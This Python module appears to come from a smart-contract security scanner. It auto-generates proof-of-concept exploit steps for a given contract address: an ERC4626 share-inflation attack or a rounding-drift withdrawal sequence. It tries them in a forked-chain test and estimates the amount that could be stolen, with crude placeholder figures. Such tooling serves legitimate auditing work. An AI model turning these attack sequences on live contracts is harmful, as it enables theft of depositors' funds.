"""Automatic proof of concept generation."""
from typing import Dict, Any, List
from scanner.impact import estimate_impact
from scanner.real_poc_generator import generate_fork_poc
from scanner.config import RPCS


def run_autopoc(addr: str, signals: Dict[str, Any]) -> Dict[str, Any]:
    """
    Generate PoC with fork testing.

    Args:
        addr: Contract address
        signals: Analysis signals dictionary

    Returns:
        PoC dictionary with exploit steps
    """
    # Generate exploit steps based on signals
    exploit_steps = _generate_exploit_steps(addr, signals)
    
    # Try to run fork PoC (if Foundry available)
    try:
        poc_result = generate_fork_poc(addr, exploit_steps, fork_url=RPCS[0])
        if poc_result.get("success"):
            return {
                "stealable_wei": signals.get("dust_accumulation", 0) * 100,  # Estimate
                "tx_needed": len(exploit_steps),
                "is_exploit": True,
                "exploit_steps": exploit_steps,
                "fork_test": poc_result,
                "fork_block": "latest"
            }
    except Exception:
        pass
    
    # Fallback to simulation
    simulated = {
        "delta": (signals.get("dust_accumulation", 0) +
                  signals.get("fee_drift", 0) +
                  signals.get("precision_loss", 0)),
        "tx": max(
            signals.get("loop_iterations", 1),
            signals.get("calls", 1)
        )
    }
    impact = estimate_impact(simulated)
    impact["exploit_steps"] = exploit_steps
    return impact


def _generate_exploit_steps(addr: str, signals: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    Generate exploit steps based on signals.
    
    Strategies:
    1. Inflation Attack (Share Price Manipulation)
    2. Rounding Drift (Repeated Withdrawals)
    """
    steps = []
    
    # Check for share manipulation signals (Inflation Attack)
    # If it's a vault-like contract with precision issues
    is_vault = signals.get("is_vault_like", False) or any(f.get("type") == "share_asset_conversion" for f in signals.get("findings", []))
    
    if is_vault:
        # Strategy 1: Inflation Attack (ERC4626-like)
        # 1. Get tokens
        steps.append({
            "description": "Get tokens for attack",
            "function": "deal_and_approve",
            "args": [10 * 10**18],  # 10 tokens
            "value": 0
        })
        
        # 2. Deposit 1 wei (mint 1 share)
        steps.append({
            "description": "Deposit 1 wei to get 1 share (Front-run)",
            "function": "deposit",
            "args": [1],
            "value": 0
        })
        
        # 3. Donate large amount to inflate price per share
        steps.append({
            "description": "Donate 1 token to inflate price per share",
            "function": "donate",
            "args": [1 * 10**18],
            "value": 0
        })
        
        # 4. Check inflation
        steps.append({
            "description": "Verify inflated share price",
            "function": "check_inflation",
            "args": [],
            "value": 0
        })
        
        # 5. Victim deposit (simulated) - should get 0 shares
        # Note: In a real test we'd need another actor, but here we just show the state
        
    elif signals.get("dust_accumulation", 0) > 0:
        # Strategy 2: Rounding Drift (Dust Accumulation)
        
        # 1. Get tokens
        steps.append({
            "description": "Get tokens for drift attack",
            "function": "deal_and_approve",
            "args": [1000000],
            "value": 0
        })
        
        # 2. Initial deposit
        steps.append({
            "description": "Initial deposit",
            "function": "deposit",
            "args": [1000000],
            "value": 0
        })
        
        # 3. Repeated operations
        for i in range(min(signals.get("loop_iterations", 5), 10)):
            steps.append({
                "description": f"Drift operation {i+1}",
                "function": "withdraw",
                "args": [999999], # Amount causing rounding
                "value": 0
            })
            
        # 4. Final withdrawal
        steps.append({
            "description": "Extract remaining",
            "function": "withdraw",
            "args": [1],
            "value": 0
        })
    
    else:
        # Fallback / Generic Strategy
        steps.append({
            "description": "Generic deposit test",
            "function": "deposit",
            "args": [1000],
            "value": 0
        })
    
    return steps
